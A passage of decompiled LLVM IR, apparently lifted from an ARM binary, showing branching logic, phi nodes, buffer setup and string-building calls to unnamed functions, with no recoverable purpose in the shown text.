  %stack_var_-2320.2 = phi i32 [ %stack_var_-2320.6, %dec_label_pc_a878 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a778 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a7fc ], [ %stack_var_-2320.8.ph, %dec_label_pc_a1bc ], [ %stack_var_-2320.8.ph, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %stack_var_-2324.2 = phi i32 [ %stack_var_-2324.6, %dec_label_pc_a878 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a778 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a7fc ], [ %stack_var_-2324.8.ph, %dec_label_pc_a1bc ], [ %stack_var_-2324.8.ph, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %stack_var_-2340.1 = phi i32 [ %stack_var_-2340.5, %dec_label_pc_a878 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a778 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a7fc ], [ %stack_var_-2340.7.ph, %dec_label_pc_a1bc ], [ %stack_var_-2340.7.ph, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %stack_var_-2332.1 = phi i32 [ %stack_var_-2332.5, %dec_label_pc_a878 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a778 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a7fc ], [ %stack_var_-2332.7.ph, %dec_label_pc_a1bc ], [ %stack_var_-2332.7.ph, %.thread19.dec_label_pc_a1c4_crit_edge ]
  %v3_a1c4 = call i32 @function_9aa8(i32 %v0_a1c4, i8 %v1_a1c4.off0)
  store i32 %v3_a1c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a89c

dec_label_pc_a1cc:                                ; preds = %dec_label_pc_a180
  %v1_a1cc = add i32 %v0_a1cc, 8
  %v2_a1cc = inttoptr i32 %v1_a1cc to i32*
  %v3_a1cc = load i32, i32* %v2_a1cc, align 4
  store i32 %v3_a1cc, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v3_a1cc, i32* %r0.global-to-local, align 4
  %v2_a1d8 = call i32 @function_b7ac(i32 %v3_a1cc, i32 3)
  %v0_a1dc = load i32, i32* @r6, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  %v1_a1e0 = and i32 %v2_a1d8, -2049
  store i32 %v1_a1e0, i32* @r2, align 4
  %v0_a1e4 = load i32, i32* @r4, align 4
  store i32 %v0_a1e4, i32* %r0.global-to-local, align 4
  %v2_a1e8 = call i32 @function_b7ac(i32 %v0_a1e4, i32 %v0_a1dc)
  %v0_a1ec = load i32, i32* @r5, align 4
  store i32 %v0_a1ec, i32* @r0, align 4
  store i32 2, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a1f4:                                ; preds = %.thread114, %.thread103, %.thread34, %.thread37, %.thread22, %.thread25, %.thread28, %.thread31, %.thread41, %.thread44, %.thread47, %.thread50, %dec_label_pc_a884, %dec_label_pc_a0f8, %dec_label_pc_a1cc
  %stack_var_-2336.1 = phi i32 [ %stack_var_-2336.3, %.thread34 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a884 ], [ %stack_var_-2336.6.ph, %.thread47 ], [ %stack_var_-2336.6.ph, %.thread50 ], [ %stack_var_-2336.6.ph, %.thread41 ], [ %stack_var_-2336.6.ph, %.thread44 ], [ %stack_var_-2336.6.ph, %.thread22 ], [ %stack_var_-2336.6.ph, %.thread25 ], [ %stack_var_-2336.6.ph, %.thread28 ], [ %stack_var_-2336.6.ph, %.thread31 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a1cc ], [ %stack_var_-2336.6.ph, %dec_label_pc_a0f8 ], [ %stack_var_-2336.3, %.thread37 ], [ %stack_var_-2336.3, %.thread103 ], [ %stack_var_-2336.6.ph, %.thread114 ]
  %stack_var_-2316.1 = phi i16* [ %stack_var_-2316.3, %.thread34 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a884 ], [ %stack_var_-2316.6.lcssa, %.thread47 ], [ %stack_var_-2316.6.lcssa, %.thread50 ], [ %stack_var_-2316.6.lcssa, %.thread41 ], [ %stack_var_-2316.6.lcssa, %.thread44 ], [ %stack_var_-2316.6.lcssa, %.thread22 ], [ %stack_var_-2316.6.lcssa, %.thread25 ], [ %stack_var_-2316.6.lcssa, %.thread28 ], [ %stack_var_-2316.6.lcssa, %.thread31 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a1cc ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a0f8 ], [ %stack_var_-2316.3, %.thread37 ], [ %stack_var_-2316.3, %.thread103 ], [ %stack_var_-2316.6.lcssa, %.thread114 ]
  %stack_var_-2328.4 = phi i16 [ %stack_var_-2328.6, %.thread34 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a884 ], [ %stack_var_-2328.9.ph, %.thread47 ], [ %stack_var_-2328.9.ph, %.thread50 ], [ %stack_var_-2328.9.ph, %.thread41 ], [ %stack_var_-2328.9.ph, %.thread44 ], [ %stack_var_-2328.9.ph, %.thread22 ], [ %stack_var_-2328.9.ph, %.thread25 ], [ %stack_var_-2328.9.ph, %.thread28 ], [ %stack_var_-2328.9.ph, %.thread31 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a1cc ], [ %stack_var_-2328.9.ph, %dec_label_pc_a0f8 ], [ %stack_var_-2328.6, %.thread37 ], [ %stack_var_-2328.6, %.thread103 ], [ %stack_var_-2328.9.ph, %.thread114 ]
  %stack_var_-2320.3 = phi i32 [ %stack_var_-2320.5, %.thread34 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a884 ], [ %stack_var_-2320.8.ph, %.thread47 ], [ %stack_var_-2320.8.ph, %.thread50 ], [ %stack_var_-2320.8.ph, %.thread41 ], [ %stack_var_-2320.8.ph, %.thread44 ], [ %stack_var_-2320.8.ph, %.thread22 ], [ %stack_var_-2320.8.ph, %.thread25 ], [ %stack_var_-2320.8.ph, %.thread28 ], [ %stack_var_-2320.8.ph, %.thread31 ], [ %stack_var_-2320.8.ph, %dec_label_pc_a1cc ], [ %stack_var_-2320.8.ph, %dec_label_pc_a0f8 ], [ %stack_var_-2320.5, %.thread37 ], [ %stack_var_-2320.5, %.thread103 ], [ %stack_var_-2320.8.ph, %.thread114 ]
  %stack_var_-2324.3 = phi i32 [ %stack_var_-2324.5, %.thread34 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a884 ], [ %stack_var_-2324.8.ph, %.thread47 ], [ %stack_var_-2324.8.ph, %.thread50 ], [ %stack_var_-2324.8.ph, %.thread41 ], [ %stack_var_-2324.8.ph, %.thread44 ], [ %stack_var_-2324.8.ph, %.thread22 ], [ %stack_var_-2324.8.ph, %.thread25 ], [ %stack_var_-2324.8.ph, %.thread28 ], [ %stack_var_-2324.8.ph, %.thread31 ], [ %stack_var_-2324.8.ph, %dec_label_pc_a1cc ], [ %stack_var_-2324.8.ph, %dec_label_pc_a0f8 ], [ %stack_var_-2324.5, %.thread37 ], [ %stack_var_-2324.5, %.thread103 ], [ %stack_var_-2324.8.ph, %.thread114 ]
  %stack_var_-2340.2 = phi i32 [ %stack_var_-2340.4, %.thread34 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a884 ], [ %stack_var_-2340.7.ph, %.thread47 ], [ %stack_var_-2340.7.ph, %.thread50 ], [ %stack_var_-2340.7.ph, %.thread41 ], [ %stack_var_-2340.7.ph, %.thread44 ], [ %stack_var_-2340.7.ph, %.thread22 ], [ %stack_var_-2340.7.ph, %.thread25 ], [ %stack_var_-2340.7.ph, %.thread28 ], [ %stack_var_-2340.7.ph, %.thread31 ], [ %stack_var_-2340.7.ph, %dec_label_pc_a1cc ], [ %stack_var_-2340.7.ph, %dec_label_pc_a0f8 ], [ %stack_var_-2340.4, %.thread37 ], [ %stack_var_-2340.4, %.thread103 ], [ %stack_var_-2340.7.ph, %.thread114 ]
  %stack_var_-2332.2 = phi i32 [ %stack_var_-2332.4, %.thread34 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a884 ], [ %stack_var_-2332.7.ph, %.thread47 ], [ %stack_var_-2332.7.ph, %.thread50 ], [ %stack_var_-2332.7.ph, %.thread41 ], [ %stack_var_-2332.7.ph, %.thread44 ], [ %stack_var_-2332.7.ph, %.thread22 ], [ %stack_var_-2332.7.ph, %.thread25 ], [ %stack_var_-2332.7.ph, %.thread28 ], [ %stack_var_-2332.7.ph, %.thread31 ], [ %stack_var_-2332.7.ph, %dec_label_pc_a1cc ], [ %stack_var_-2332.7.ph, %dec_label_pc_a0f8 ], [ %stack_var_-2332.4, %.thread37 ], [ %stack_var_-2332.4, %.thread103 ], [ %stack_var_-2332.7.ph, %.thread114 ]
  %v0_a1f4 = call i32 @function_9a7c()
  store i32 %v0_a1f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a89c

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a124
  %v3_a1fc = icmp eq i32 %v5_a170, -1
  %v8_a1fc = icmp eq i32 %v5_a170, -1
  %v1_a200 = load i32, i32* @r5, align 4
  store i32 %v1_a200, i32* @r0, align 4
  %v1_a174. = select i1 %v8_a1fc, i32 %v1_a174, i32 5
  store i32 %v1_a174., i32* @r1, align 4
  br i1 %v3_a1fc, label %.thread19.dec_label_pc_a1c4_crit_edge, label %dec_label_pc_a898

.thread19.dec_label_pc_a1c4_crit_edge:            ; preds = %dec_label_pc_a1fc
  %extract.t100 = trunc i32 %v1_a174. to i8
  br label %dec_label_pc_a1c4

dec_label_pc_a218:                                ; preds = %dec_label_pc_a8c0
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v7_a21c = icmp eq i32 %arg1, 2
  br i1 %v7_a21c, label %.thread22, label %dec_label_pc_a22c

.thread22:                                        ; preds = %dec_label_pc_a218
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a22c:                                ; preds = %dec_label_pc_a218
  %v7_a230 = icmp eq i32 %arg1, 3
  br i1 %v7_a230, label %.thread25, label %dec_label_pc_a240

.thread25:                                        ; preds = %dec_label_pc_a22c
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 4, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a240:                                ; preds = %dec_label_pc_a22c
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v7_a244 = icmp eq i32 %arg1, 1
  br i1 %v7_a244, label %.thread28, label %dec_label_pc_a254

.thread28:                                        ; preds = %dec_label_pc_a240
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 3, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a254:                                ; preds = %dec_label_pc_a240
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v7_a258 = icmp eq i32 %arg1, 4
  br i1 %v7_a258, label %.thread31, label %dec_label_pc_a26c

.thread31:                                        ; preds = %dec_label_pc_a254
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 5, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a26c:                                ; preds = %dec_label_pc_9df8, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge, %dec_label_pc_a254
  %stack_var_-2336.2 = phi i32 [ %stack_var_-2336.6.ph, %dec_label_pc_a254 ], [ %tmp123, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %tmp123, %dec_label_pc_9df8 ]
  %stack_var_-2316.2 = phi i16* [ %stack_var_-2316.6.lcssa, %dec_label_pc_a254 ], [ %tmp127, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %tmp127, %dec_label_pc_9df8 ]
  %stack_var_-2328.5 = phi i16 [ %stack_var_-2328.9.ph, %dec_label_pc_a254 ], [ %tmp128, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %tmp128, %dec_label_pc_9df8 ]
  %stack_var_-2320.4 = phi i32 [ %stack_var_-2320.8.ph, %dec_label_pc_a254 ], [ %tmp129, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %tmp129, %dec_label_pc_9df8 ]
  %stack_var_-2324.4 = phi i32 [ %stack_var_-2324.8.ph, %dec_label_pc_a254 ], [ %tmp130, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %tmp130, %dec_label_pc_9df8 ]
  %stack_var_-2340.3 = phi i32 [ %stack_var_-2340.7.ph, %dec_label_pc_a254 ], [ %tmp131, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %v2_9bd4, %dec_label_pc_9df8 ]
  %stack_var_-2332.3 = phi i32 [ %stack_var_-2332.7.ph, %dec_label_pc_a254 ], [ %tmp132, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %v0_9bcc, %dec_label_pc_9df8 ]
  %storemerge5 = phi i32 [ 0, %dec_label_pc_a254 ], [ %v0_9e68.pre, %dec_label_pc_9b7c.dec_label_pc_9e68_crit_edge ], [ %v0_9bf4, %dec_label_pc_9df8 ]
  store i32 %storemerge5, i32* %r0.global-to-local, align 4
  %v1_a26c = call i32 @function_d7fc(i32 %storemerge5)
  store i32 %v1_a26c, i32* %r0.global-to-local, align 4
  %v0_a270.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a270

dec_label_pc_a270:                                ; preds = %dec_label_pc_a8c0, %dec_label_pc_a26c
  %v0_a298 = phi i32 [ %v0_a270.pre, %dec_label_pc_a26c ], [ %v4_9ed4, %dec_label_pc_a8c0 ]
  %stack_var_-2336.3 = phi i32 [ %stack_var_-2336.2, %dec_label_pc_a26c ], [ %stack_var_-2336.6.ph, %dec_label_pc_a8c0 ]
  %stack_var_-2316.3 = phi i16* [ %stack_var_-2316.2, %dec_label_pc_a26c ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a8c0 ]
  %stack_var_-2328.6 = phi i16 [ %stack_var_-2328.5, %dec_label_pc_a26c ], [ %stack_var_-2328.9.ph, %dec_label_pc_a8c0 ]
  %stack_var_-2320.5 = phi i32 [ %stack_var_-2320.4, %dec_label_pc_a26c ], [ %stack_var_-2320.8.ph, %dec_label_pc_a8c0 ]
  %stack_var_-2324.5 = phi i32 [ %stack_var_-2324.4, %dec_label_pc_a26c ], [ %stack_var_-2324.8.ph, %dec_label_pc_a8c0 ]
  %stack_var_-2340.4 = phi i32 [ %stack_var_-2340.3, %dec_label_pc_a26c ], [ %stack_var_-2340.7.ph, %dec_label_pc_a8c0 ]
  %stack_var_-2332.4 = phi i32 [ %stack_var_-2332.3, %dec_label_pc_a26c ], [ %stack_var_-2332.7.ph, %dec_label_pc_a8c0 ]
  %v1_a270 = add i32 %v0_a298, 17
  %v2_a270 = inttoptr i32 %v1_a270 to i8*
  %v3_a270 = load i8, i8* %v2_a270, align 1
  %v4_a270 = zext i8 %v3_a270 to i32
  store i32 %v4_a270, i32* %r3.global-to-local, align 4
  %v7_a274 = icmp eq i8 %v3_a270, 2
  br i1 %v7_a274, label %.thread34, label %dec_label_pc_a284

.thread34:                                        ; preds = %dec_label_pc_a270
  store i32 %v0_a298, i32* @r0, align 4
  store i32 12, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a284:                                ; preds = %dec_label_pc_a270
  %v7_a284 = icmp eq i8 %v3_a270, 3
  br i1 %v7_a284, label %.thread37, label %dec_label_pc_a294

.thread37:                                        ; preds = %dec_label_pc_a284
  store i32 %v0_a298, i32* @r0, align 4
  store i32 14, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a294:                                ; preds = %dec_label_pc_a284
  store i32 ptrtoint ([18 x i8]* @global_var_13f1c.168 to i32), i32* %r1.global-to-local, align 4
  %v1_a298 = add i32 %v0_a298, 8
  %v2_a298 = inttoptr i32 %v1_a298 to i32*
  %v3_a298 = load i32, i32* %v2_a298, align 4
  store i32 %v3_a298, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_a2a4 = call i32 @function_c4d8(i32 %v3_a298, i32 ptrtoint ([18 x i8]* @global_var_13f1c.168 to i32), i32 17, i32 16384)
  store i32 %v5_a2a4, i32* %r0.global-to-local, align 4
  %tmp179 = icmp slt i32 %v5_a2a4, 1
  br i1 %tmp179, label %dec_label_pc_a878, label %.thread103

.thread103:                                       ; preds = %dec_label_pc_a294
  %v5_a2ac = load i32, i32* @r5, align 4
  store i32 %v5_a2ac, i32* @r0, align 4
  store i32 9, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a8c0
  store i32 %v4_9ed4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_13f30.170 to i32), i32* %r1.global-to-local, align 4
  %v3_a2c4 = call i32 @function_9994(i32 %v4_9ed4, i32 ptrtoint ([10 x i8]* @global_var_13f30.170 to i32))
  store i32 %v3_a2c4, i32* %r0.global-to-local, align 4
  store i32 %v3_a2c4, i32* @r8, align 4
  %v2_a2c8 = icmp eq i32 %v3_a2c4, 0
  br i1 %v2_a2c8, label %dec_label_pc_a650, label %dec_label_pc_a2d0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a2bc
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_a2d8 = call i32 @function_d0b4(i32 4, i32 4)
  %v1_a2dc = load i32, i32* @r5, align 4
  %v2_a2dc = add i32 %v1_a2dc, 1044
  %v3_a2dc = inttoptr i32 %v2_a2dc to i32*
  store i32 %v2_a2d8, i32* %v3_a2dc, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = add i32 %v0_a2e4, 18
  store i32 %v1_a2e4, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14d88.172 to i32), i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v2_a2f0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_a2f0, i32* @r0, align 4
  %v0_a2f4 = call i32 @function_bfd0()
  store i32 %v1_a2e4, i32* @r0, align 4
  %v0_a2fc = call i32 @function_aab8()
  %v0_a300 = load i32, i32* %r6.global-to-local, align 4
  %v1_a300 = load i32, i32* @r8, align 4
  %v2_a300 = add i32 %v1_a300, %v0_a300
  store i32 %v2_a300, i32* @r1, align 4
  store i32 %v0_a2fc, i32* @r2, align 4
  store i32 %v0_a300, i32* @r0, align 4
  %v3_a30c = call i32 @function_bfe0(i32 %v0_a300, i32 %v2_a300, i32 %v0_a2fc)
  store i32 %v3_a30c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v0_a318 = load i32, i32* @r5, align 4
  %v1_a318 = add i32 %v0_a318, 19
  store i32 %v1_a318, i32* @sb, align 4
  %v1_a350197.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a34c

dec_label_pc_a320:                                ; preds = %dec_label_pc_a34c, %.thread40
  %v1_a33c208 = phi i32 [ %v1_a344, %.thread40 ], [ %v0_a34c, %dec_label_pc_a34c ]
  %v0_a320207 = phi i32 [ %v0_a320.pre, %.thread40 ], [ %v0_a32085, %dec_label_pc_a34c ]
  %v1_a324 = add i32 %v0_a320207, 2296
  store i32 %v1_a324, i32* %r1.global-to-local, align 4
  %v1_a328 = load i32, i32* %r6.global-to-local, align 4
  %v2_a328 = add i32 %v1_a328, %v1_a33c208
  %v3_a328 = inttoptr i32 %v2_a328 to i8*
  %v4_a328 = load i8, i8* %v3_a328, align 1
  %v1_a32c = load i32, i32* @sp, align 4
  %v2_a32c = add i32 %v1_a32c, %v1_a324
  %v3_a32c = inttoptr i32 %v2_a32c to i8*
  %v4_a32c = load i8, i8* %v3_a32c, align 1
  %v6_a32c = zext i8 %v4_a32c to i32
  store i32 %v6_a32c, i32* %r3.global-to-local, align 4
  %v9_a330 = icmp eq i8 %v4_a328, %v4_a32c
  store i32 %v2_a328, i32* %r0.global-to-local, align 4
  br i1 %v9_a330, label %bb180, label %.thread40

bb180:                                            ; preds = %dec_label_pc_a320
  %v1_a338 = load i32, i32* @sb, align 4
  %v3_a338 = add i32 %v1_a338, %v1_a33c208
  store i32 %v3_a338, i32* %r1.global-to-local, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_a320, %bb180
  store i32 41796, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v9_a330, i32 ptrtoint (i32* @global_var_bfe0.173 to i32))
  %v0_a344 = load i32, i32* %r4.global-to-local, align 4
  %v1_a344 = add i32 %v0_a344, 1
  %v0_a320.pre = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_a344, i32* %r4.global-to-local, align 4
  %v1_a350 = load i32, i32* @r8, align 4
  %v5_a354 = icmp slt i32 %v1_a344, %v1_a350
  br i1 %v5_a354, label %dec_label_pc_a320, label %dec_label_pc_a358

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a358.dec_label_pc_a34c_crit_edge, %dec_label_pc_a2d0
  %v1_a350197 = phi i32 [ %v1_a350197226, %dec_label_pc_a358.dec_label_pc_a34c_crit_edge ], [ %v1_a350197.pre, %dec_label_pc_a2d0 ]
  %v0_a32085 = phi i32 [ %v1_a358, %dec_label_pc_a358.dec_label_pc_a34c_crit_edge ], [ 0, %dec_label_pc_a2d0 ]
  %v0_a34c = phi i32 [ %v0_a34c.pre, %dec_label_pc_a358.dec_label_pc_a34c_crit_edge ], [ 0, %dec_label_pc_a2d0 ]
  store i32 %v0_a34c, i32* %r4.global-to-local, align 4
  %v5_a354206 = icmp slt i32 %v0_a34c, %v1_a350197
  br i1 %v5_a354206, label %dec_label_pc_a320, label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %.thread40, %dec_label_pc_a34c
  %v1_a350197226 = phi i32 [ %v1_a350197, %dec_label_pc_a34c ], [ %v1_a350, %.thread40 ]
  %v0_a320.lcssa = phi i32 [ %v0_a32085, %dec_label_pc_a34c ], [ %v0_a320.pre, %.thread40 ]
  %v1_a358 = add i32 %v0_a320.lcssa, 1
  store i32 %v1_a358, i32* %r7.global-to-local, align 4
  %v7_a35c = icmp eq i32 %v1_a358, 8
  br i1 %v7_a35c, label %dec_label_pc_a364, label %dec_label_pc_a358.dec_label_pc_a34c_crit_edge

dec_label_pc_a358.dec_label_pc_a34c_crit_edge:    ; preds = %dec_label_pc_a358
  %v0_a34c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_a34c

dec_label_pc_a364:                                ; preds = %dec_label_pc_a358
  store i32 0, i32* @r8, align 4
  store i32 0, i32* @r7, align 4
  %v0_a3a8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_a3a8

dec_label_pc_a370:                                ; preds = %dec_label_pc_a3a8
  %v0_a370 = call i32 @function_aab8()
  %v1_a374 = add i32 %v0_a370, 1
  store i32 %v1_a374, i32* %r0.global-to-local, align 4
  %v1_a378 = call i32 @function_c77c(i32 %v1_a374)
  store i32 %v1_a378, i32* %r0.global-to-local, align 4
  %v0_a37c = load i32, i32* @r5, align 4
  %v1_a37c = add i32 %v0_a37c, 1044
  %v2_a37c = inttoptr i32 %v1_a37c to i32*
  %v3_a37c = load i32, i32* %v2_a37c, align 4
  store i32 %v3_a37c, i32* %r3.global-to-local, align 4
  %v1_a380 = load i32, i32* @r7, align 4
  %v2_a380 = load i32, i32* @r4, align 4
  %v3_a380 = add i32 %v2_a380, %v1_a380
  %v4_a380 = inttoptr i32 %v3_a380 to i32*
  store i32 %v1_a378, i32* %v4_a380, align 4
  %v0_a384 = load i32, i32* @r6, align 4
  store i32 %v0_a384, i32* @r0, align 4
  %v0_a388 = load i32, i32* %r3.global-to-local, align 4
  %v1_a388 = load i32, i32* @r7, align 4
  %v2_a388 = add i32 %v1_a388, %v0_a388
  %v3_a388 = inttoptr i32 %v2_a388 to i32*
  %v4_a388 = load i32, i32* %v3_a388, align 4
  store i32 %v4_a388, i32* %r4.global-to-local, align 4
  %v0_a38c = call i32 @function_aab8()
  %v0_a390 = load i32, i32* @r6, align 4
  store i32 %v0_a390, i32* %r1.global-to-local, align 4
  store i32 %v0_a38c, i32* @r2, align 4
  store i32 %v4_a388, i32* %r0.global-to-local, align 4
  %v3_a39c = call i32 @function_ab04(i32 %v4_a388, i32 %v0_a390, i32 %v0_a38c)
  store i32 %v3_a39c, i32* %r0.global-to-local, align 4
  %v0_a3a0 = load i32, i32* @r7, align 4
  %v1_a3a0 = add i32 %v0_a3a0, 4
  store i32 %v1_a3a0, i32* @r7, align 4
  %v0_a3a4 = load i32, i32* @r8, align 4
  store i32 %v0_a3a4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_a3a8

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a370
  %v0_a3a8 = phi i32 [ %v0_a3a8.pre, %dec_label_pc_a364 ], [ %v0_a3a4, %dec_label_pc_a370 ]
  store i32 %v0_a3a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_13f3c.175 to i32), i32* %r1.global-to-local, align 4
  %v3_a3b0 = call i32 @function_ab70(i32 %v0_a3a8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_13f3c.175, i32 0, i32 0))
  store i32 %v3_a3b0, i32* @r0, align 4
  store i32 %v3_a3b0, i32* @r6, align 4
  %v2_a3b4 = icmp eq i32 %v3_a3b0, 0
  %v0_a3b8 = load i32, i32* @r5, align 4
  %v1_a3b8 = add i32 %v0_a3b8, 1044
  %v2_a3b8 = inttoptr i32 %v1_a3b8 to i32*
  %v3_a3b8 = load i32, i32* %v2_a3b8, align 4
  store i32 %v3_a3b8, i32* @r4, align 4
  br i1 %v2_a3b4, label %dec_label_pc_a3c0, label %dec_label_pc_a370

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a3a8
  %v1_a3c0 = add i32 %v3_a3b8, 4
  %v2_a3c0 = inttoptr i32 %v1_a3c0 to i32*
  %v3_a3c0 = load i32, i32* %v2_a3c0, align 4
  store i32 %v3_a3c0, i32* @r4, align 4
  store i32 %v3_a3c0, i32* @r0, align 4
  %v0_a3c8 = call i32 @function_aab8()
  %v0_a3cc = load i32, i32* @r4, align 4
  %v1_a3cc = add i32 %v0_a3cc, 12
  store i32 %v1_a3cc, i32* @r1, align 4
  store i32 %v0_a3c8, i32* @r2, align 4
  store i32 %v0_a3cc, i32* @r0, align 4
  %v3_a3d8 = call i32 @function_bfe0(i32 %v0_a3cc, i32 %v1_a3cc, i32 %v0_a3c8)
  store i32 %v3_a3d8, i32* %r0.global-to-local, align 4
  %v0_a3dc = load i32, i32* @r5, align 4
  %v1_a3dc = add i32 %v0_a3dc, 1044
  %v2_a3dc = inttoptr i32 %v1_a3dc to i32*
  %v3_a3dc = load i32, i32* %v2_a3dc, align 4
  store i32 %v3_a3dc, i32* %r3.global-to-local, align 4
  %v2_a3e0 = icmp eq i32 %v3_a3dc, 0
  br i1 %v2_a3e0, label %dec_label_pc_a878, label %dec_label_pc_a778

dec_label_pc_a3ec:                                ; preds = %dec_label_pc_a8c0
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a3f4 = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  %v4_a3f8 = call i32 @function_ab54(i32 %v1_a3f4, i8 0, i32 1024)
  store i32 ptrtoint ([27 x i8]* @global_var_13f40.177 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a3f4, i32* @r0, align 4
  %v3_a404 = call i32 @function_ab24(i32 %v1_a3f4, i32 ptrtoint ([27 x i8]* @global_var_13f40.177 to i32))
  store i32 %v3_a404, i32* %r0.global-to-local, align 4
  %v0_a408 = load i32, i32* @r5, align 4
  %v1_a408 = add i32 %v0_a408, 1044
  %v2_a408 = inttoptr i32 %v1_a408 to i32*
  %v3_a408 = load i32, i32* %v2_a408, align 4
  store i32 %v3_a408, i32* %r3.global-to-local, align 4
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  %v1_a410 = inttoptr i32 %v3_a408 to i32*
  %v2_a410 = load i32, i32* %v1_a410, align 4
  store i32 %v2_a410, i32* @r1, align 4
  %v2_a414 = bitcast i32* %stack_var_-1284 to i8*
  %v3_a414 = call i32 @function_aad8(i8* %v2_a414, i32 %v2_a410)
  store i32 ptrtoint ([11 x i8]* @global_var_13f5c.179 to i32), i32* @r1, align 4
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  %v4_a420 = call i32 @function_aad8(i8* %v2_a414, i32 ptrtoint ([11 x i8]* @global_var_13f5c.179 to i32))
  store i32 %v4_a420, i32* %r0.global-to-local, align 4
  %v0_a424 = load i32, i32* @r5, align 4
  %v1_a424 = add i32 %v0_a424, 1044
  %v2_a424 = inttoptr i32 %v1_a424 to i32*
  %v3_a424 = load i32, i32* %v2_a424, align 4
  store i32 %v3_a424, i32* %r3.global-to-local, align 4
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  %v1_a42c = add i32 %v3_a424, 4
  %v2_a42c = inttoptr i32 %v1_a42c to i32*
  %v3_a42c = load i32, i32* %v2_a42c, align 4
  store i32 %v3_a42c, i32* @r1, align 4
  %v3_a430 = call i32 @function_aad8(i8* %v2_a414, i32 %v3_a42c)
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([88 x i8]* @global_var_13f68.181 to i32), i32* @r1, align 4
  %v4_a43c = call i32 @function_aad8(i8* %v2_a414, i32 ptrtoint ([88 x i8]* @global_var_13f68.181 to i32))
  store i32 %v4_a43c, i32* %r0.global-to-local, align 4
  %v0_a444 = load i32, i32* @r5, align 4
